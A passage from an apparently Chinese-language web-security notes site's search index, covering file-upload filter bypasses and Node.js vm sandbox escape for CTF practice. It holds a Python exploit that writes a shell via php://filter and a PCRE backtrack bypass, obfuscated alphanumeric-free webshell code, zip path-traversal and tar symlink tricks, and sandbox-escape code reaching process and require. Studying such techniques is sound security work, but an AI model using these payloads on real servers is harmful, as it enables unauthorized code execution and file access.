<p></p>"},{"location":"web_bak/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/#_2","title":"\u4e0a\u4f20\u7ed5\u8fc7\u59ff\u52bf","text":""},{"location":"web_bak/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/#_3","title":"\u524d\u7aef\u4e0a\u4f20\u8fc7\u6ee4","text":"<p>\u524d\u7aef\u5bf9\u6587\u4ef6\u540e\u7f00\u8fdb\u884c\u68c0\u67e5\uff0c\u8be5\u79cd\u901a\u8fc7\u6293\u5305\u4fee\u6539\u6570\u636e\u5305\u5373\u53ef\u89e3\u51b3\u3002</p> <p>\u6240\u8c13\u7684\u524d\u7aef\u5c31\u662f\u4f60\u6240\u770b\u5230\u7684\u6d4f\u89c8\u5668\u7684\u9875\u9762\uff0c\u4ed6\u628a\u8fc7\u6ee4\u51fd\u6570\u4e5f\u4e00\u8d77\u4f20\u8fc7\u6765\u6267\u884c\uff0c</p> <p>\u8fd9\u4e2a\u7b80\u5355\uff0c\u751a\u81f3\u4f60F12\u628a\u90a3\u6bb5\u8fc7\u6ee4\u7684\u4ee3\u7801\u5220\u9664\u90fd\u884c</p>"},{"location":"web_bak/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/#_4","title":"\u6587\u4ef6\u540d\u68c0\u67e5","text":"<p>\u5927\u5c0f\u5199\u7ed5\u8fc7</p> <ul> <li>\u5728windows\u4e0b\uff0c\u53ef\u4ee5\u5c06\u540e\u7f00\u5199\u4e3apHp</li> </ul> <p>unicode</p> <ul> <li>\u5f53\u76ee\u6807\u5b58\u5728json_decode\u4e14\u68c0\u67e5\u5728json_decode\u4e4b\u524d,\u53ef\u4ee5\u5c06php\u5199\u4e3a\\u0070hp</li> </ul> <p>php3457</p> <ul> <li>\u8be5\u9879\u4e3aapache\u4e13\u5c5e</li> </ul> <p>\u5173\u952e\u70b9\u5728<code>/etc/apache2/mods-available/php5.6.conf</code>\u8fd9\u4e2a\u6587\u4ef6\uff0c\u6ee1\u8db3<code>.+\\.ph(p[3457]?|t|tml)$</code>\uff0c\u90fd\u4f1a\u88ab\u5f53\u4f5cphp\u6587\u4ef6\u89e3\u6790\u3002\u5728apache2\u76ee\u5f55\u4e0b<code>grep -r x-httpd-php /etc/apache2</code>\u627e\u5230\u5bf9\u5e94\u6587\u4ef6\u5c31\u80fd\u77e5\u9053\u89e3\u6790\u54ea\u4e9b\u540e\u7f00</p> <p></p> <p>\u5229\u7528\u6b63\u5219\u56de\u6eafpcre\u9650\u5236</p> <ul> <li>\u8fd9\u4e2a\u4e4b\u524d\u63d0\u8d77\u5230\u8fc7</li> </ul> <p>pcre\u9ed8\u8ba4\u9650\u5236\u4e3a100w</p> <p>\u6709\u5982\u4e0b\u573a\u666f</p> <pre><code>&lt;?phpif(!preg_match('/.+?ph/is',$_POST['n']))file_put_contents($_POST['n'],$_POST['s']);\n</code></pre> <p>\u53ef\u5229\u7528\u5982\u4e0bexp\u89e3\u51b3</p> <pre><code>import requests\ndata= {'n':\"php://filter/write=convert.base64-decode/\"+'/'*1000000+'/resource=shell.php','s':\"PD9waHAgcGhwaW5mbygpPz4=\"}######\u6240\u4ee5\u6211\u8bf4\u662f100wprint (requests.post('http://127.0.0.1',data=data).text)\n</code></pre>"},{"location":"web_bak/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/#_5","title":"\u8bf7\u6c42\u5934\u68c0\u67e5","text":"<p>\u5c06php\u6587\u4ef6\u7684<code>content-type:application/octet-stream</code>\u4fee\u6539\u4e3a<code>image/png</code>\u7b49\u5c31\u53ef\u4ee5</p> <p>\u9644\u4e0a\u4e00\u4e2a\u67e5\u627e\u7684\u7f51\u7ad9</p> <p>HTTP Content-type \u5bf9\u7167\u8868</p> <p>OSCHINA.NET\u5728\u7ebf\u5de5\u5177,ostools\u4e3a\u5f00\u53d1\u8bbe\u8ba1\u4eba\u5458\u63d0\u4f9b\u5728\u7ebf\u5de5\u5177\uff0c\u63d0\u4f9bjsbin\u5728\u7ebf CSS\u3001JS \u8c03\u8bd5\uff0c\u5728\u7ebf Java API\u6587\u6863,\u5728\u7ebf PHP API\u6587\u6863,\u5728\u7ebf Node.js API\u6587\u6863,Less CSS\u7f16\u8bd1\u5668\uff0cMarkDown\u7f16\u8bd1\u5668\u7b49\u5176\u4ed6\u5728\u7ebf\u5de5\u5177</p> <p>https://tool.oschina.net/commons/</p>"},{"location":"web_bak/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/#_6","title":"\u6587\u4ef6\u5185\u5bb9\u68c0\u67e5","text":"<p>\u7ed5\u8fc7&lt;?php,&lt;?=</p> <p>https://www.php.net/manual/zh/language.basic-syntax.phpmode.php</p> <p></p> <p>\u5176\u4e2d\u7b2c2\u79cd\u5728php7\u79cd\u4e0d\u53ef\u4ee5\u4f7f\u7528\uff0c\u5728php5\u4e2d\u53ef\u4ee5\u4f7f\u7528</p> <p>\u5176\u5b9e\u5c31\u662f\u4e00\u53e5\u8bdd\u6728\u9a6c\u76844\u79cd\u5199\u6cd5\uff08\u8334\u5b57\u76844\u79cd\u5199\u6cd5\uff0c\u4f60\u77e5\u9053\u4e48...\uff09</p> <p>\u7ed5\u8fc7[a-zA-Z0-9]</p> <p>\u4e00\u4e9b\u4e0d\u5305\u542b\u6570\u5b57\u548c\u5b57\u6bcd\u7684webshell | \u79bb\u522b\u6b4c</p> <p>phith0n\u7684\u5c0f\u7ad9\uff0c\u957f\u671f\u5b58\u5728\u4e0e\u5206\u4eab\u5173\u4e8e\u7f51\u7edc\u5b89\u5168\u4e0e\u5404\u79cd\u7f16\u7a0b\u7684\u539f\u521b\u6587\u7ae0\u3002</p> <p>https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</p> <p>\u65e0\u5b57\u6bcd\u6570\u5b57webshell\u4e4b\u63d0\u9ad8\u7bc7 | \u79bb\u522b\u6b4c</p> <p>phith0n\u7684\u5c0f\u7ad9\uff0c\u957f\u671f\u5b58\u5728\u4e0e\u5206\u4eab\u5173\u4e8e\u7f51\u7edc\u5b89\u5168\u4e0e\u5404\u79cd\u7f16\u7a0b\u7684\u539f\u521b\u6587\u7ae0\u3002</p> <p>https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</p> <p>\ud83d\udc46\u8fd9\u4e2a\u786e\u5b9e\u662f\u4e2a\u5927\u795e</p> <p>\u4ec5\u6570\u5b57+\u7b26\u53f7</p> <ul> <li>waf\u4ee3\u7801\u5982\u4e0b\uff1a</li> </ul> <pre><code>&lt;?php error_reporting(0); if(!isset($_GET['num'])){     show_source(__FILE__); }else{     $str = $_GET['num'];     $blacklist = ['[a-z]', '[\\x7f-\\xff]', '\\s',\"'\", '\"', '`', '\\[', '\\]','\\$', '_', '\\\\\\\\','\\^', ','];     foreach ($blacklist as $blackitem) {         if (preg_match('/' . $blackitem . '/im', $str)) {             die(\"what are you want to do?\");         }     }     @eval('echo '.$str.';'); } ?&gt;\n</code></pre> <p>\u4f7f\u7528\u5982\u4e0b</p> <pre><code>&lt;?php $a ='';$a .= ((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(3)){1}));$a .= ((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(9)){1}));$a .= ((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(3)){1}));$a .= ((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(4)){1}));$a .= (((10000000000000000000).(1)){3});$a .= ((((10000000000000000000).(1)){3})|(((-1).(1)){0}));echo $a; //systEm?&gt;\n&lt;?php $a ='';$a .= (((10000000000000000000).(1)){3}); // E$a .= (((((10000000000000000000).(1)){3})|(((1.1).(1)){1}))&amp;((~(((1).(7)){1})|(((1).(0)){1}))|(((1).(6)){1}))); //n$a .= ((((10000000000000000000).(1)){3})&amp;((~(((1).(7)){1})|(((1).(0)){1}))|(((1).(6)){1}))); //Decho $a; //EnD?&gt;\n&lt;?php // getallheaders$a ='';$a .= ((((10000000000000000000).(1)){3})|(((1.1).(1)){1})&amp;((~(((1).(8)){1})|(((1).(7)){1})))); // g$a .= (((10000000000000000000).(1)){3}); // E$a .= ((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(4)){1})); //T$a .= ((((10000000000000000000).(1)){3})&amp;((~(((1).(7)){1})|(((1).(0)){1}))|(((1).(1)){1}))); //a$a .= (((((10000000000000000000).(1)){3})|(((1.1).(1)){1}))&amp;((~(((1).(7)){1})|(((1).(0)){1}))|(((1).(4)){1}))); // l$a .= (((((10000000000000000000).(1)){3})|(((1.1).(1)){1}))&amp;((~(((1).(7)){1})|(((1).(0)){1}))|(((1).(4)){1}))); // l$a .= (((((10000000000000000000).(1)){3})|(((1.1).(1)){1}))&amp;((~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1}))); // h$a .= (((10000000000000000000).(1)){3}); // E$a .= ((((10000000000000000000).(1)){3})&amp;((~(((1).(7)){1})|(((1).(0)){1}))|(((1).(1)){1}))); //a$a .= ((((10000000000000000000).(1)){3})&amp;((~(((1).(7)){1})|(((1).(0)){1}))|(((1).(4)){1}))); //D$a .= (((10000000000000000000).(1)){3}); // E$a .= ((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(2)){1})); // r$a .= ((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(3)){1})); // secho $a;?&gt;\n</code></pre> <p>RCTF 2020 Official Writeup - ROIS Blog</p> <p>https://blog.rois.io/en/2020/rctf-2020-official-writeup-2/</p> <p>\u7ed5\u8fc7;(\u5206\u53f7)</p> <ul> <li></li> </ul> <pre><code>&lt;?=phpinfo()?&gt;\n</code></pre> <p>exif_imagetype()</p> <ul> <li>\u8be5\u51fd\u6570\u4e3a\u83b7\u53d6\u56fe\u7247\u7684\u7c7b\u578b\uff0c\u5e38\u7528\u4e8e\u68c0\u6d4b\u4e0a\u4f20\u6587\u4ef6\u7684\u7c7b\u578b</li> </ul> <p>\uff081\uff09\u53ef\u4ee5\u4f7f\u7528\u5728\u6587\u4ef6\u5934\u6dfb\u52a0\u9b54\u672f\u5b57\u8282GIF89a\u5373\u53ef\u7ed5\u8fc7</p> <p>\uff082\uff09\u4f7f\u7528copy\u547d\u4ee4\u5c06\u6728\u9a6c\u653e\u5728\u4e00\u4e2a\u6b63\u5e38\u6587\u4ef6\u4e4b\u540e</p> <p>get_imagesize()</p> <ul> <li>\u8be5\u51fd\u6570\u4e3a\u83b7\u53d6\u56fe\u7247\u7684\u957f\u5bbd\uff0c\u5e38\u7528\u4e8e\u68c0\u6d4b\u4e0a\u4f20\u6587\u4ef6\u7684\u7c7b\u578b</li> </ul> <p>\uff081\uff09\u53ef\u4ee5\u5728\u6587\u4ef6\u4e4b\u524d\u6dfb\u52a0</p> <pre><code>#define width 1337                          #define height 1337\n</code></pre> <p>\u5373\u53ef\u7ed5\u8fc7</p> <p>\u4e8c\u6b21\u6e32\u67d3</p> <ul> <li></li> </ul> <p>\u6316\u6d1e\u59ff\u52bf\uff1a\u7279\u6b8a\u7684\u4e0a\u4f20\u6280\u5de7\uff0c\u7ed5\u8fc7PHP\u56fe\u7247\u8f6c\u6362\u5b9e\u73b0\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\uff08RCE\uff09 - FreeBuf\u7f51\u7edc\u5b89\u5168\u884c\u4e1a\u95e8\u6237</p> <p>\u6211\u4f7f\u7528\u4e86\u4e00\u4e2a\u7279\u6b8a\u7684\u56fe\u7247\u4e0a\u4f20\u6280\u5de7\uff0c\u7ed5\u8fc7PHP GD\u5e93\u5bf9\u56fe\u7247\u7684\u8f6c\u6362\u5904\u7406\uff0c\u6700\u7ec8\u6210\u529f\u5b9e\u73b0\u4e86\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u3002</p> <p></p>"},{"location":"web_bak/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/#_7","title":"\u591a\u6587\u4ef6\u4e0a\u4f20","text":"<p>\u5f53\u670d\u52a1\u5668\u652f\u6301\u591a\u6587\u4ef6\u4e0a\u4f20\uff0c\u4f46\u53ea\u5bf9\u4e0a\u4f20\u7684\u7b2c\u4e00\u4e2a\u8fdb\u884c\u8fc7\u6ee4\u65f6\uff0c\u53ef\u4ee5\u4e00\u6b21\u4e0a\u4f20\u591a\u4e2a\u6587\u4ef6\u8fdb\u884c\u7ed5\u8fc7\u3002</p>"},{"location":"web_bak/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/#_8","title":"\u538b\u7f29\u6587\u4ef6\u4e0a\u4f20","text":"<p>tar\u538b\u7f29\u5305</p> <ul> <li>linux\u73af\u5883</li> </ul> <pre><code>ln -s / 1.jpg \u4f1a\u5728\u5f53\u524d\u76ee\u5f55\u4e0b\u751f\u6210\u4e00\u4e2a\u540d\u4e3a1.jpg\u7684\u8f6f\u94fe\u63a5tar cf 1.tar 1.jpg\u4e0a\u4f20\u5230\u670d\u52a1\u5668\uff0c\u8bbf\u95ee1.jpg\uff0c\u5c31\u53ef\u4ee5\u5728\u670d\u52a1\u5668\u4e2d\u6f2b\u6e38\u4e86\u4e5f\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u529e\u6cd5\u7ed5\u8fc7php_flag engine off\n</code></pre> <p>https://250.ac.cn/2019/11/09/2019-\u6e56\u6e58\u676f-web\u90e8\u5206-WriteUp/#\u9884\u671f\u89e3</p> <p>zip\u538b\u7f29\u5305</p> <ul> <li>\u5982\u679c\u670d\u52a1\u5668\u5bf9\u4e0a\u4f20\u7684zip\u6587\u4ef6\u76f4\u63a5\u89e3\u538b\u7684\u8bdd\uff0c\u5c31\u53ef\u4ee5\u6784\u7b51\u8fd9\u6837\u4e00\u4e2a\u6587\u4ef6\u6765\u7ed5\u8fc7</li> </ul> <p>\u73af\u5883\uff1a/var/www/html/upload\u76ee\u5f55\u4e0d\u89e3\u6790php\u6587\u4ef6\uff0c\u89e3\u538b\u6587\u4ef6\u9ed8\u8ba4\u5728upload\u4e0b</p> <pre><code>\u65b0\u5efa1234.php\uff0c\u5185\u5bb9\u4efb\u610f\u5c061234.php\u538b\u7f29\u4e3a1234.zip\u6587\u4ef6\u4f7f\u7528hxd\u6216\u8005010editor\u7b4916\u8fdb\u5236\u7f16\u8f91\u5668\u7f16\u8f911234.zip\u6587\u4ef6\uff0c\u5c06\u6240\u6709\u5b57\u7b26\u4e321234.php\u66ff\u6362\u4e3a../1.php\uff08../1\u5171\u56db\u4f4d\u6240\u4ee5\u4f7f\u75281234\u4e3a\u6587\u4ef6\u540d\uff0c\u53ef\u6839\u636e\u9700\u6c42\u4fee\u6539\uff09\uff0c\u4fdd\u5b58\u3002\u5c06\u4fee\u6539\u540e\u76841234.zip\u4e0a\u4f20\uff0c\u7ecf\u8fc7\u670d\u52a1\u5668\u89e3\u538b\uff0c\u4f1a\u5728/var/www/html\u4e0b\u751f\u6210\u4e00\u4e2a1.php\n</code></pre> <p>\u5176\u5b9e\u538b\u7f29\u6587\u4ef6\u4e0a\u4f20\u7684\u8bdd\uff0c\u540e\u9762\u7684\u4f2a\u534f\u8bae\u4e5f\u6709\u4e00\u4e9b\u6765\u8bfb\u53d6\u538b\u7f29\u6587\u4ef6\u7684\u64cd\u4f5c</p> <p>\u6bd4\u5982\u8bf4zip://\u548cphar://\u4f2a\u534f\u8bae\uff08jar\u662f\u4e0d\u662f\u548cphar\u5f88\u50cf\uff1fjar=java,phar=php\uff09</p>"},{"location":"web_bak/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/#_9","title":"\u6761\u4ef6\u7ade\u4e89","text":"<p>\u5728\u4e00\u4e9b\u4e0a\u4f20\u573a\u666f\u4e2d\uff0c\u4e0a\u4f20\u7684\u6587\u4ef6\u4e0a\u4f20\u6210\u529f\u540e\u4f1a\u88ab\u7acb\u9a6c\u5220\u9664\uff0c\u5bfc\u81f4\u65e0\u6cd5\u8bbf\u95ee\u4e0a\u4f20\u7684\u6587\u4ef6\u3002\u6240\u4ee5\u4ece\u4e0a\u4f20\u6210\u529f\u5230\u88ab\u5220\u9664\u7684\u8fd9\u6bb5\u65f6\u95f4\u5927\u6982\uff08\u51e0\u767ems\uff09\u5b58\u5728\u4e00\u4e2a\u7a7a\u6863\uff0c\u6211\u4eec\u5229\u7528\u8fd9\u6bb5\u7a7a\u6863\u53ef\u4ee5\u8bbf\u95ee\u5230\u4e0a\u4f20\u7684\u6587\u4ef6\u3002\u4f46\u662f\u624b\u5de5\u64cd\u4f5c\u80af\u5b9a\u662f\u6765\u4e0d\u53ca\uff0c\u6211\u4eec\u5199\u811a\u672c\u64cd\u4f5c\u4e5f\u6765\u4e0d\u53ca\u3002\u6240\u4ee5\u53ef\u4ee5\u901a\u8fc7\u4e0d\u65ad\u7684\u4e0a\u4f20\u6587\u4ef6\uff0c\u5e76\u4e0d\u65ad\u7684\u8bbf\u95ee\u5230\u8fbe\u76ee\u7684\u3002</p> <p>\u4f9d\u8d56\u4e8e\u811a\u672c\uff0c\u540e\u9762\u627e\u5230\u4e86\u4f1a\u653e\u4e2a\u4f8b\u5b50\u4e0a\u6765\u3002</p>"},{"location":"web_bak/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/#else","title":"else\u5176\u4ed6","text":"<p>\u4e0b\u9762\u7684\u81ea\u5df1\u6162\u6162\u770b\u6162\u6162\u5b66\u5427</p> <p>rce</p> <pre><code>imagick rce:CVE-2016\u20133714\n</code></pre> <p>file_put_contents</p> <ul> <li><code>file_put_contents($filename,$content);</code></li> </ul> <p>filename\u53c2\u6570\u652f\u6301\u4ee5url\u5f62\u5f0f\u5199\u5165\uff0c\u652f\u6301php\u4f2a\u534f\u8bae\uff0c\u652f\u6301\u8fdc\u7a0b\u8bfb\u53d6\u6587\u4ef6</p> <p>\u5177\u4f53\u53c2\u8003\uff1a</p> <p>file_put_content\u548c\u6b7b\u4ea1\u00b7\u6742\u7cc5\u4ee3\u7801\u4e4b\u7f18 - \u5148\u77e5\u793e\u533a</p> <p>\u5148\u77e5\u793e\u533a\uff0c\u5148\u77e5\u5b89\u5168\u6280\u672f\u793e\u533a</p> <p>https://xz.aliyun.com/t/8163</p>"},{"location":"web_bak/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/JavaScript/Node.js/nodejs%E6%B2%99%E7%9B%92/","title":"node.js\u6c99\u76d2\u9003\u9038","text":"<p>\u65e5\u5e38\u5f00\u53d1\u9700\u6c42\u4e2d\u6709\u65f6\u5019\u4e3a\u4e86\u8ffd\u6c42\u7075\u6d3b\u6027\u6216\u964d\u4f4e\u5f00\u53d1\u96be\u5ea6\uff0c\u4f1a\u5728\u4e1a\u52a1\u4ee3\u7801\u91cc\u76f4\u63a5\u4f7f\u7528eval/Function/vm \u7b49\u529f\u80fd\uff0c\u5176\u4e2d eval/Function \u7b97\u662f\u52a8\u6001\u6267\u884c JS\uff0c\u4f46\u65e0\u6cd5\u5c4f\u853d\u5f53\u524d\u6267\u884c\u73af\u5883\u7684\u4e0a\u4e0b\u6587\uff0c\u4f46 node.js \u91cc\u63d0\u4f9b\u4e86 vm \u6a21\u5757\uff0c\u76f8\u5f53\u4e8e\u4e00\u4e2a\u865a\u62df\u673a\uff0c\u53ef\u4ee5\u8ba9\u4f60\u5728\u6267\u884c\u4ee3\u7801\u65f6\u5019\u9694\u79bb\u5f53\u524d\u7684\u6267\u884c\u73af\u5883\uff0c\u907f\u514d\u88ab\u6076\u610f\u4ee3\u7801\u653b\u51fb\u3002</p> <p>\u81f3\u4e8e\u4e3a\u4ec0\u4e48\u5355\u72ec\u62ff\u51fa\u6765\uff0c\u53ef\u80fd\u662f\u56e0\u4e3a\u6ca1\u5730\u65b9\u653e\u4e86</p>"},{"location":"web_bak/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/JavaScript/Node.js/nodejs%E6%B2%99%E7%9B%92/#vm","title":"vm \u57fa\u672c\u4ecb\u7ecd","text":"<p>vm \u6a21\u5757\u53ef\u5728 V8 \u865a\u62df\u673a\u4e0a\u4e0b\u6587\u4e2d\u7f16\u8bd1\u548c\u8fd0\u884c\u4ee3\u7801\uff0c\u865a\u62df\u673a\u4e0a\u4e0b\u6587\u53ef\u81ea\u884c\u914d\u7f6e\uff0c\u5229\u7528\u8be5\u7279\u6027\u505a\u5230\u6c99\u76d2\u7684\u6548\u679c\u3002\u4f8b\u5982\uff1a</p> <pre><code>const vm = require(\"vm\");const x = 1;const y = 2;const context = { x: 2, console };vm.createContext(context); // \u4e0a\u4e0b\u6587\u9694\u79bb\u5316\u5bf9\u8c61\u3002const code = \"console.log(x); console.log(y)\";vm.runInContext(code, context);// \u8f93\u51fa 2// Uncaught ReferenceError: y is not defin\n</code></pre> <p>\u6839\u636e\u4ee5\u4e0a\u793a\u4f8b\uff0c\u53ef\u4ee5\u770b\u51fa\u548c eval/Function \u6700\u5927\u7684\u533a\u522b\u5c31\u662f\u53ef\u81ea\u5b9a\u4e49\u4e0a\u4e0b\u6587\uff0c\u4e5f\u5c31\u53ef\u4ee5\u63a7\u5236\u88ab\u6267\u884c\u4ee3\u7801\u7684\u8bbf\u95ee\u8d44\u6e90\u3002\u4f8b\u5982\u4ee5\u4e0a\u793a\u4f8b\uff0c\u9664\u4e86\u8bed\u8a00\u7684\u8bed\u6cd5\u3001\u5185\u7f6e\u5bf9\u8c61\u7b49\uff0c\u65e0\u6cd5\u8bbf\u95ee\u5230\u8d85\u51fa\u4e0a\u4e0b\u6587\u5916\u7684\u4efb\u4f55\u4fe1\u606f\uff0c\u6240\u4ee5\u793a\u4f8b\u4e2d\u51fa\u73b0\u4e86\u9519\u8bef\u63d0\u793a: y \u672a\u5b9a\u4e49</p>"},{"location":"web_bak/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/JavaScript/Node.js/nodejs%E6%B2%99%E7%9B%92/#_1","title":"\u9003\u9038\u8fc7\u7a0b","text":""},{"location":"web_bak/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/JavaScript/Node.js/nodejs%E6%B2%99%E7%9B%92/#_2","title":"\u9003\u9038\u793a\u4f8b\uff1a","text":"<pre><code>const vm = require(\"vm\");const ctx = {};vm.runInNewContext(   'this.constructor.constructor(\"return process\")().exit()',    ctx);console.log(\"Never gets executed.\");\n</code></pre> <p>\u4ee5\u4e0a\u793a\u4f8b\u4e2d this \u6307\u5411 ctx \u5e76\u901a\u8fc7\u539f\u578b\u94fe\u7684\u65b9\u5f0f\u62ff\u5230\u6c99\u76d2\u5916\u7684 Funtion\uff0c\u5b8c\u6210\u9003\u9038\uff0c\u5e76\u6267\u884c\u9003\u9038\u540e\u7684 JS \u4ee3\u7801\u3002</p> <p>tmp = ctx.constructor; // Object</p> <p>exec = tmp.constructor; // Function</p> <p>exec(\"return Process\");</p> <p>\u9003\u9038\u53ef\u4ee5\u57fa\u672c\u5212\u5206\u4e3a\u8fd9\u4e09\u4e2a\u9636\u6bb5</p> <p>\u7531\u4e8e JS \u91cc\u6240\u6709\u5bf9\u8c61\u7684\u539f\u578b\u94fe\u90fd\u4f1a\u6307\u5411 Object.prototype\uff0c\u4e14 Object.prototype \u548c Function \u4e4b\u95f4\u662f\u76f8\u4e92\u6307\u5411\u7684\uff0c\u6240\u6709\u5bf9\u8c61\u901a\u8fc7\u539f\u578b\u94fe\u90fd\u80fd\u62ff\u5230 Function\uff0c\u6700\u7ec8\u5b8c\u6210\u6c99\u76d2\u9003\u9038\u5e76\u6267\u884c\u4ee3\u7801\u3002</p> <p>\u9003\u9038\u540e\u4ee3\u7801\u53ef\u4ee5\u6267\u884c\u5982\u4e0b\u4ee3\u7801\u62ff\u5230 require\uff0c\u4ece\u800c\u5e76\u52a0\u8f7d\u5176\u4ed6\u6a21\u5757\u529f\u80fd</p> <pre><code>const vm = require(\"vm\");const ctx = Object.create(null);ctx.data = {};vm.runInNewContext(   'this.data.constructor.constructor(\"return process\")().exit()',    ctx);// \u9003\u9038\u6210\u529f\uff01console.log(\"Never gets executed.\");\n</code></pre> <p>\u539f\u6765\u5982\u679c\u5c06\u5bf9\u8c61\u7c7b\u578b\u8bbe\u7f6e\u4e3aNULL\uff0c\u90a3\u4e48\u5e94\u5f53\u4e3a\u62a5\u9519\uff0c\u4f46\u4e0a\u9762\u7684\u4f8b\u5b57\u662f\u53ef\u4ee5\u6b63\u786e\u6b63\u5e38\u6267\u884c\u7684\uff0c\u539f\u56e0\u5c31\u662f\u4e00\u5f00\u59cb\u6240\u8bf4\u7684\u6307\u5411\u95ee\u9898\u3002</p> <pre><code>const vm = require(\"vm\");const ctx = {    console,};vm.runInNewContext(    var exec = this.constructor.constructor;    var require =exec('return process.mainModule.constructor._load')();   console.log(require('fs'));`,    ctx);\n</code></pre> <p>\u6700\u7ec8\u6267\u884c\u5916\u90e8\u4ee3\u7801\uff0c\u5b8c\u6210node.js\u6c99\u76d2\u9003\u9038\u3002</p> <p></p> <p></p> <p>\u4f8b\u9898\u5fd8\u8bb0\u5728\u54ea\u4e86\u3002</p>"},{"location":"web_bak/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/JavaScript/Node.js/Nodejs-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/%E5%8E%9F%E7%90%86/","title":"\u539f\u7406","text":""},{"location":"web_bak/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/JavaScript/Node.js/Nodejs-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/%E5%8E%9F%E7%90%86/#javascript","title":"javascript \u539f\u578b\u94fe","text":"<p>\u5728javascript\u4e2d\uff0c\u7ee7\u627f\u7684\u6574\u4e2a\u8fc7\u7a0b\u5c31\u79f0\u4e3a\u8be5\u7c7b\u7684\u539f\u578b\u94fe\u3002</p> <p>\u6bcf\u4e2a\u5bf9\u8c61\u7684\u90fd\u6709\u4e00\u4e2a\u6307\u5411\u4ed6\u7684\u539f\u578b(prototype)\u7684\u5185\u90e8\u94fe\u63a5\uff0c\u8fd9\u4e2a\u539f\u578b\u5bf9\u8c61\u53c8\u6709\u5b83\u81ea\u5df1\u7684\u539f\u578b\uff0c\u4e00\u76f4\u5230null\u4e3a\u6b62\u3002</p> <p>\u5728javascript\u4e2d\u4e00\u5207\u7686\u5bf9\u8c61\uff0c\u56e0\u4e3a\u6240\u6709\u7684\u53d8\u91cf\uff0c\u51fd\u6570\uff0c\u6570\u7ec4\uff0c\u5bf9\u8c61 \u90fd\u59cb\u4e8eobject\u7684\u539f\u578b\u5373object.prototype\uff0c\u4f46\u53ea\u6709\u7c7b\u6709\u5bf9\u8c61\uff0c\u5bf9\u8c61\u6ca1\u6709\uff0c\u5bf9\u8c61\u6709\u7684\u662f<code>__proto__</code>\u3002</p> <p>like:</p> <p>\u65e5\u671f\u65f6\uff1a</p> <p><code>f -&gt; Data.prototype -&gt; object.prototype-&gt;null</code></p> <p>\u51fd\u6570\u65f6\uff1a</p> <p><code>d -&gt; function.prototype -&gt; object.prototype-&gt;null</code></p> <p>\u6570\u7ec4\u65f6\uff1a</p> <p><code>c -&gt; array.prototype -&gt; object.prototype-&gt;null</code></p> <p>\u7c7b\u65f6\uff1a</p> <p><code>b -&gt; a.prototype -&gt; object.prototype-&gt;null</code></p> <p>\u5f53\u8981\u4f7f\u7528\u6216\u8f93\u51fa\u4e00\u4e2a\u53d8\u91cf\u65f6\uff1a\u9996\u5148\u4f1a\u5728\u672c\u5c42\u4e2d\u641c\u7d22\u76f8\u5e94\u7684\u53d8\u91cf\uff0c\u5982\u679c\u4e0d\u5b58\u5728\u7684\u8bdd\uff0c\u5c31\u4f1a\u5411\u4e0a\u641c\u7d22\uff0c\u5373\u5728\u81ea\u5df1\u7684\u7236\u7c7b\u4e2d\u641c\u7d22\uff0c\u5f53\u7236\u7c7b\u4e2d\u4e5f\u6ca1\u6709\u65f6\uff0c\u5c31\u4f1a\u5411\u7956\u7236\u7c7b\u641c\u7d22\uff0c\u76f4\u5230\u6307\u5411null\uff0c\u5982\u679c\u6b64\u65f6\u8fd8\u6ca1\u6709\u641c\u7d22\u5230\uff0c\u5c31\u4f1a\u8fd4\u56de undefined\u3002</p> 